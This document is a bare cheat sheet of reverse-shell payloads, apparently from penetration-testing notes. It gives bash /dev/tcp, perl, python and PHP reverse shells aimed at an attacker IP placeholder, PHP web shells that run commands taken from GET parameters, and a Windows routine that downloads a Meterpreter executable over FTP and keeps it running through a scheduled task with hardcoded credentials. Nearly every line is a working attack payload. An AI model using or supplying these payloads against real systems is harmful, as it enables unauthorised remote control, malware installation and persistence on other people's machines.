## netcat shell
nc -nlvp 443

## bash shell
bash -i >& /dev/tcp/**[your_ip_addr]**/443 0>&1

bash -i >& /dev/tcp/**[your_ip_addr]**/4444 0>&1

## perl reverse shell
perl -e 'use Socket;$i="**[your_ip_addr]**";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("**[your_ip_addr]**",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## php reverse shell (php code)
set_time_limit (0);$VERSION = "1.0";$ip = '**[your_ip_addr]**'; $port = 443; $chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;chdir("/");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);$descriptorspec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"));$process = proc_open($shell, $descriptorspec, $pipes);
stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);while (1) {$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) {    $input = fread($sock, $chunk_size); fwrite($pipes[0], $input);}    if (in_array($pipes[1], $read_a)) {    $input = fread($pipes[1], $chunk_size);    fwrite($sock, $input);    }if (in_array($pipes[2], $read_a)) { $input = fread($pipes[2], $chunk_size); fwrite($sock, $input);} }fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process);

## simple cmd shell
<?php system($_GET["cmd"]);?>

## php cmd shell
<?php eval($_GET["cmd"]);?>

## php reverse shell (bash)
<?php system("bash -i >& /dev/tcp/**[your_ip_addr]**/443 0>&1"); ?>
<?php system("bash -i >& /dev/tcp/**[your_ip_addr]**/4444 0>&1"); ?>

## spawn bash from python
python -c 'import pty;pty.spawn("/bin/bash")'

## meterpreter
echo open **[your_ip_addr]** > ftp &echo user alan password >> ftp &echo binary >> ftp &echo get met.exe >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp

SCHTASKS /Create /SC MINUTE /MO 5 /TN met /TR c:\meter.exe /RU alan /RP password1!
schtasks /delete /tn met /f
